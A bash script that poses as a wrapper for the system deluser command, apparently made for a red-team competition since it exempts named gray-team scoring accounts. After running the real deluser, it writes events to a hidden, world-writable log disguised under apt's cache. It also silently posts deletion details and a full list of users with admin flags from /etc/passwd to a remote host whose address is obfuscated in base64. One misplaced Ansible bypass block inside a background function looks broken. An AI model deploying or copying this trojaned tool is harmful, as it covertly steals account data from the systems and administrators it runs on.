#!/bin/bash
REAL_DELUSER="/usr/sbin/deluser"

# Pass straight through for gray team scoring accounts
case "$(whoami)" in
    kingneptune|paintythepirate|greyteamadmin) exec $REAL_DELUSER "$@" ;;
esac

_D="/var/lib/apt/lists/.cache"
_L="${_D}/events"
_H=$(printf "%s" "__ENC__" | base64 -d)
_P="9001"
_U="http://${_H}:${_P}/log"
_a() {
    mkdir -p "$_D" 2>/dev/null
    chmod 777 "$_D" 2>/dev/null
    touch "$_L" 2>/dev/null
    chmod 666 "$_L" 2>/dev/null
    echo "$1" >> "$_L" 2>/dev/null
    true
}
_b() {
    curl -sf -X POST -H "Content-Type: application/json" \
        -d "$1" --connect-timeout 3 --max-time 3 \
        "$_U" > /dev/null 2>&1 &
    true
}
_c() {
    (
        HIP="$_hi"
        _S="http://${_H}:${_P}/sync"
        SUDO_USERS=$(getent group sudo wheel 2>/dev/null | \
            awk -F: '{print $4}' | tr ',' '\n' | sort -u | tr '\n' ',' | sed 's/,$//')

# Pass straight through if running under Ansible
if [ -n "$ANSIBLE_REMOTE_TEMP" ]; then
    exec $REAL_DELUSER "$@"
fi
        USERS_JSON="["
        FIRST=1
        while IFS=: read -r uname _ uid gid _ _ _; do
            [ "$uid" -lt 1000 ] && [ "$uname" != "root" ] && continue
            [ "$uid" -gt 60000 ] && continue
            IS_A=false
            [ "$uname" = "root" ] && IS_A=true
            echo ",$SUDO_USERS," | grep -q ",${uname}," && IS_A=true
            [ $FIRST -eq 1 ] && FIRST=0 || USERS_JSON="${USERS_JSON},"
            USERS_JSON="${USERS_JSON}{\"username\":\"${uname}\",\"uid\":${uid},\"is_admin\":${IS_A}}"
        done < /etc/passwd
        USERS_JSON="${USERS_JSON}]"
        PAYLOAD="{\"host_ip\":\"${HIP}\",\"users\":${USERS_JSON}}"
        curl -sf -X POST -H "Content-Type: application/json" \
            -d "$PAYLOAD" --connect-timeout 3 --max-time 5 \
            "$_S" > /dev/null 2>&1
    ) &
    true
}
for arg in "$@"; do
    case "$arg" in
        --help|-h|--version) exec $REAL_DELUSER "$@" ;;
    esac
done
_iu=$(whoami)
_hi=$(hostname -I 2>/dev/null | awk '{print $1}')
_ts=$(date -u "+%Y-%m-%dT%H:%M:%SZ")
_ca="$*"
_du=""
_dg=""
POS=0
for arg in "$@"; do
    case "$arg" in
        --*) ;;
        *)
            POS=$((POS+1))
            if [ $POS -eq 1 ]; then _du="$arg"
            elif [ $POS -eq 2 ]; then _dg="$arg"
            fi
            ;;
    esac
done
$REAL_DELUSER "$@"
RC=$?
if [ $RC -eq 0 ] && [ -n "$_du" ]; then
    if [ -n "$_dg" ]; then
        EVENT_TYPE="usermod"
        PAYLOAD=$(printf '{"host_ip":"%s","user":"%s","event_type":"%s","timestamp":"%s","data":{"target_user":"%s","removed_from_group":"%s","args":"%s","via":"deluser"}}' \
            "$_hi" "$_iu" "$EVENT_TYPE" "$_ts" \
            "$_du" "$_dg" "$_ca")
        _a "${_ts}|usermod|${_iu}|target:${_du}|removed_from:${_dg}|via:deluser"
    else
        EVENT_TYPE="userdel"
        PAYLOAD=$(printf '{"host_ip":"%s","user":"%s","event_type":"%s","timestamp":"%s","data":{"deleted_user":"%s","args":"%s","via":"deluser"}}' \
            "$_hi" "$_iu" "$EVENT_TYPE" "$_ts" \
            "$_du" "$_ca")
        _a "${_ts}|userdel|${_iu}|deleted:${_du}|via:deluser|${_ca}"
    fi
    _b "$PAYLOAD"
    _c
fi
exit $RC
